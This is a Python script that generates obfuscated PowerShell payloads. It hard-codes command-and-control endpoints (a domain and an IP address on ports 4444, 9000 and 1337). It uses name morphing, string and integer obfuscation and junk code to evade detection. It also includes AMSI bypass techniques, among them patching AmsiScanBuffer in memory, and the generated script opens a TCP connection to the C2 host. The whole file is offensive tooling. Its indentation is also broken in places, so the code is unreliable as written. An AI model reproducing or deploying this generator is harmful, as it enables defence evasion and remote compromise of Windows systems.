import random
import string
import unicodedata
import base64
import os
import re
import math
import datetime
import itertools
import sys

# Configuration
C2_ENDPOINTS = [
    ("ghostintheshellredteam.com", 4444),
    ("ghostintheshellredteam.com", 9000),
    ("ghostintheshellredteam.com", 1337),
    ("66.228.62.178", 4444),
    ("66.228.62.178", 9000),
    ("66.228.62.178", 1337)
]

# --- Enhanced Variable/Function Name Morphing ---
def random_unicode_letter():
    pools = [
        string.ascii_letters,
        'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ',  # Greek uppercase
        'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  # Cyrillic lowercase
        '𝒜𝒞𝒟𝒢𝒥𝒦𝒩𝒪𝒫𝒬𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵',  # Math script
        '𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩',  # Math bold script
        '𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ'  # Double-struck
    ]
    pool = random.choice(pools)
    return random.choice(pool)

def morph_name(base, min_len=8, max_len=20):
    # Only use PowerShell-valid variable name characters
    safe_chars = string.ascii_letters + string.digits + '_'
    name = ''.join(random.choice([c, random.choice(safe_chars)]) for c in base)
    chars = list(name)

    # Enhanced case mixing
    chars = [c.upper() if random.random() < 0.5 else c.lower() for c in chars]

    # Add more complex prefixes and suffixes (only valid chars)
    prefixes = ['_', 'tmp', 'var', 'x', 'z', 'obj', 'str', 'int', 'bool', 'arr', 'ptr', 'ref', 'val', 'dat', 'buf']
    suffixes = ['_', 'Obj', 'Val', 'Str', 'Int', 'Arr', 'List', 'Dict', 'Hash', 'Map', 'Ptr', 'Ref', 'Buf', 'Mem', 'Reg']

    if random.random() < 0.6:
        chars.insert(0, random.choice(prefixes))
    if random.random() < 0.6:
        chars.append(random.choice(suffixes))

    # Ensure minimum length
    if len(chars) < min_len:
        chars += [random.choice(safe_chars) for _ in range(min_len - len(chars))]
    if len(chars) > max_len:
        chars = chars[:max_len]

    # Ensure starts with letter or underscore
    if not chars[0].isalpha() and chars[0] != '_':
        chars[0] = random.choice(string.ascii_letters + '_')

    return ''.join(chars)

# --- Enhanced String Obfuscation ---
def obfuscate_string(s):
    methods = ["b64", "hex", "chararray", "split", "format", "join", "concat", "reverse", "xor"]
    method = random.choice(methods)
    
    if method == "b64":
        b64 = base64.b64encode(s.encode()).decode()
        return f"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}'))"
    
    elif method == "hex":
        hex_str = ''.join([f'0x{ord(c):02x},' for c in s])[:-1]
        return f"[System.Text.Encoding]::UTF8.GetString([byte[]]@({hex_str}))"
    
    elif method == "chararray":
        chars = [str(ord(c)) for c in s]
        return f"[string]::new([char[]]({','.join(chars)}))"
    
    elif method == "split":
        chars = [f"'{c}'" for c in s]
        return f"(@({','.join(chars)}) -join '')"
    
    elif method == "format":
        format_parts = []
        values = []
        for i, c in enumerate(s):
            format_parts.append(f"{{{i}}}")
            values.append(f"'{c}'")
        return f"[string]::Format('{''.join(format_parts)}',{','.join(values)})"
    
    elif method == "join":
        sep = random.choice(['-', '_', '|', ':', ';', '.', ',', '~', '^', '*'])
        joined = sep.join(s)
        return f"('{joined}' -split '{sep}') -join ''"
    
    elif method == "concat":
        parts = []
        for c in s:
            parts.append(f"'{c}'")
        return ' + '.join(parts)
    
    elif method == "reverse":
        return f"('{s[::-1]}' -split '' | ForEach-Object {{ $_ }} | ForEach-Object -Begin {{ $arr = @() }} -Process {{ $arr = ,$_ + $arr }} -End {{ $arr -join '' }})"
    
    elif method == "xor":
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in s)
        return f"[System.Text.Encoding]::UTF8.GetString([byte[]]@({','.join(str(ord(c)) for c in xored)}))"

# --- Enhanced Integer Obfuscation ---
def obfuscate_int(n):
    methods = ["math", "hex", "str_parse", "split_sum"]
    method = random.choice(methods)
    
    if method == "math":
        a = random.randint(1, n)
        b = n - a
        return f"{a}+{b}"
    elif method == "hex":
        return f"0x{n:x}"
    elif method == "str_parse":
        return f"[int]::Parse('{n}')"
    elif method == "split_sum":
        parts = []
        left = n
        while left > 0:
            part = random.randint(1, left)
            parts.append(str(part))
            left -= part
        return '+'.join(parts)
    return str(n)

# --- Enhanced Junk Code Generation ---
def random_junk_code():
    junk_types = [
        lambda: f"# {''.join(random.choices(string.ascii_letters, k=30))}",
        lambda: f"${morph_name('junkvar')} = {obfuscate_string(''.join(random.choices(string.ascii_letters, k=15)))}",
        lambda: f"function {morph_name('junkfunc')} {{ param($x) return $x }}",
        lambda: f"if ({obfuscate_int(1)}+{obfuscate_int(1)} -eq {obfuscate_int(2)}) {{ }}",
        lambda: f"$null = {obfuscate_int(1)}+{obfuscate_int(1)}",
        lambda: f"${morph_name('arr')} = @( ({obfuscate_int(1)})..({obfuscate_int(10)}) ) | Get-Random -Count {obfuscate_int(5)}",
        lambda: f"${morph_name('str')} = {obfuscate_string(''.join(random.choices(string.ascii_letters, k=12)))}",
        lambda: f"${morph_name('num')} = {obfuscate_int(random.randint(1, 1000))}",
        lambda: f"${morph_name('bool')} = {random.choice(['$true', '$false'])}",
        lambda: f"${morph_name('date')} = Get-Date",
        lambda: f"${morph_name('guid')} = [guid]::NewGuid()",
        lambda: f"${morph_name('hash')} = @{{ 'key' = 'value' }}",
        lambda: f"${morph_name('regex')} = [regex]::new('.*')",
        lambda: f"${morph_name('xml')} = [xml]'<root><item>test</item></root>'",
        lambda: f"${morph_name('json')} = ConvertFrom-Json {obfuscate_string('{\"key\":\"value\"}')}",
    ]
    return random.choice(junk_types)()

def generate_unique_filename():
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"payload_{timestamp}_{random_suffix}.ps1"

# --- AMSI Bypass Techniques ---
def random_amsi_bypass():
    """Return a random AMSI bypass snippet, metamorphically obfuscated."""
    techniques = []
    # Technique 1: Classic Reflection
    var1 = morph_name('amsi')
    var2 = morph_name('init')
    var3 = morph_name('utils')
    var4 = morph_name('field')
    t1 = f"""
try {{
    ${var1} = [Ref].Assembly.GetType({obfuscate_string('System.Management.Automation.AmsiUtils')})
    ${var4} = ${var1}.GetField({obfuscate_string('amsiInitFailed')}, 'NonPublic,Static')
    ${var4}.SetValue($null, $true)
}} catch {{}}
"""
    techniques.append(t1)

    # Technique 2: Memory Patch (byte overwrite)
    var5 = morph_name('ptr')
    var6 = morph_name('bytes')
    t2 = f"""
try {{
    [Ref].Assembly.GetType({obfuscate_string('System.Management.Automation.AmsiUtils')})
    | ForEach-Object {{
        ${var5} = $_.GetField({obfuscate_string('amsiInitFailed')}, 'NonPublic,Static')
        ${var5}.SetValue($null, $true)
    }}
}} catch {{}}
"""
    techniques.append(t2)

    # Technique 3: Patch AmsiScanBuffer via Add-Type
    var7 = morph_name('sig')
    var8 = morph_name('amsi')
    t3 = f"""
try {{
    $code = @"
using System;
using System.Runtime.InteropServices;
public class {morph_name('Bypass')} {{
    [DllImport({obfuscate_string('kernel32')})]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport({obfuscate_string('kernel32')})]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport({obfuscate_string('kernel32')})]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}}
"@
    Add-Type $code
    $hModule = [Bypass]::LoadLibrary({obfuscate_string('amsi.dll')})
    $addr = [Bypass]::GetProcAddress($hModule, {obfuscate_string('AmsiScanBuffer')})
    $buf = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)
    $oldProtect = 0
    [Bypass]::VirtualProtect($addr, [uint32]$buf.Length, 0x40, [ref]$oldProtect)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
}} catch {{}}
"""
    techniques.append(t3)

    # Technique 4: Environment Variable (not always effective, but adds variety)
    t4 = f"[Environment]::SetEnvironmentVariable({obfuscate_string('AMSI_DISABLE')}, {obfuscate_string('1')}, 'User')"
    techniques.append(t4)

    # Technique 5: Remove AMSI provider (PowerShell 5+)
    t5 = f"""
try {{
    $provider = [Ref].Assembly.GetType({obfuscate_string('System.Management.Automation.AmsiUtils')})
    $field = $provider.GetField({obfuscate_string('amsiInitFailed')}, 'NonPublic,Static')
    $field.SetValue($null, $true)
}} catch {{}}
"""
    techniques.append(t5)

    # Randomly select only 1 technique for each payload
    selected = random.choice(techniques)
    # Add junk code after for more metamorphism
    return selected + '\n' + random_junk_code()

def generate_metamorphic_payload():
    try:
    filename = generate_unique_filename()
    # Morph all variable names
    vars = {k: morph_name(k) for k in [
        'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
        'readLength', 'aes', 'encryptor', 'iv', 'key', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success'
    ]}
        # AMSI bypass section
        amsi_bypass = random_amsi_bypass()
    # AES Setup with enhanced obfuscation
    aes_key = base64.b64encode(os.urandom(32)).decode()
    aes_iv = base64.b64encode(os.urandom(16)).decode()
    aes = f"""
    try {{
            ${{vars['aes']}} = [System.Security.Cryptography.Aes]::Create()
            ${{vars['aes']}}.Key = [Convert]::FromBase64String({obfuscate_string(aes_key)})
            ${{vars['aes']}}.IV = [Convert]::FromBase64String({obfuscate_string(aes_iv)})
            ${{vars['encryptor']}} = ${{vars['aes']}}.CreateDecryptor()
    }} catch {{
        $null
    }}
    """
    # Network Operations with enhanced obfuscation
    network = f"""
    try {{
            ${{vars['client']}} = New-Object System.Net.Sockets.TCPClient
        $endpoint = @(
            {','.join([f'({obfuscate_string(host)}, {obfuscate_int(port)})' for host, port in C2_ENDPOINTS])}
        ) | Get-Random
            ${{vars['result']}} = ${{vars['client']}}.BeginConnect($endpoint[0], $endpoint[1], $null, $null)
            ${{vars['success']}} = ${{vars['result']}}.AsyncWaitHandle.WaitOne((Get-Random -Minimum {obfuscate_int(500)} -Maximum {obfuscate_int(2000)}), $false)
            if (${{vars['success']}}) {{
                ${{vars['client']}}.EndConnect(${{vars['result']}})
        }}
            ${{vars['client']}}.Close()
    }} catch {{
        $null
    }}
    """
        # Prepare all blocks except AMSI bypass
    blocks = [aes, network]
        # Insert more junk code randomly (but never before AMSI bypass)
        for _ in range(random.randint(15, 25)):
        idx = random.randint(0, len(blocks))
        blocks.insert(idx, random_junk_code())
    # Add error handling preference
    code = "$ErrorActionPreference = 'SilentlyContinue'\n\n"
    # Add enhanced helper functions
    code += """
    # Enhanced helper functions
    function Convert-StringToBytes {
        param([string]$InputString)
        [System.Text.Encoding]::UTF8.GetBytes($InputString)
    }

    function Convert-ToBase64 {
        param([string]$InputString)
        [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($InputString))
    }

    function Convert-FromBase64 {
        param([string]$InputString)
        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($InputString))
    }

    function Convert-ToHex {
        param([string]$InputString)
        -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('{0:X2}', [int][char]$_) })
    }

    function Convert-FromHex {
        param([string]$InputString)
        -join ($InputString -split '(..)' | Where-Object { $_ } | ForEach-Object { [char][convert]::ToInt32($_, 16) })
    }

    function Convert-Rot13 {
        param([string]$InputString)
        $InputString.ToCharArray() | ForEach-Object {
            if ([char]::IsLetter($_)) {
                $base = if ([char]::IsUpper($_)) { [int][char]'A' } else { [int][char]'a' }
                [char](([int][char]$_ - $base + 13) % 26 + $base)
            } else { $_ }
        } -join ''
    }

    function Convert-ToUnicode {
        param([string]$InputString)
        -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('\\u{{0:X4}}', [int][char]$_) })
    }

    function Convert-FromUnicode {
        param([string]$InputString)
        [System.Text.RegularExpressions.Regex]::Unescape($InputString)
    }

    function Convert-ToBinary {
        param([string]$InputString)
        -join ($InputString.ToCharArray() | ForEach-Object { [Convert]::ToString([int][char]$_, 2).PadLeft(8, '0') })
    }

    function Convert-FromBinary {
        param([string]$InputString)
        -join ($InputString -split '(........)' | Where-Object { $_ } | ForEach-Object { [char][Convert]::ToInt32($_, 2) })
    }
    \n\n"""
        # Add AMSI bypass first, then all other blocks
        code += amsi_bypass + '\n' + '\n'.join(blocks)
    # Save with unique filename
    with open(filename, 'w') as f:
        f.write(code)
    return filename
    except Exception as e:
        print(f"Error generating payload: {e}", file=sys.stderr)
        # Create a basic error payload
        error_filename = f"error_payload_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        with open(error_filename, 'w') as f:
            f.write(f"# Error generating payload: {str(e)}\n")
            f.write("Write-Host 'Failed to generate payload'\n")
        return error_filename

if __name__ == "__main__":
    try:
        filename = generate_metamorphic_payload()
        print(f"Metamorphic payload written to {filename}")
    except Exception as e:
        print("ERROR: Exception during payload generation:", e, file=sys.stderr)
        import traceback
        traceback.print_exc()
        with open('payload_error.ps1', 'w') as f:
            f.write(f"# ERROR: {e}\n")
        exit(1)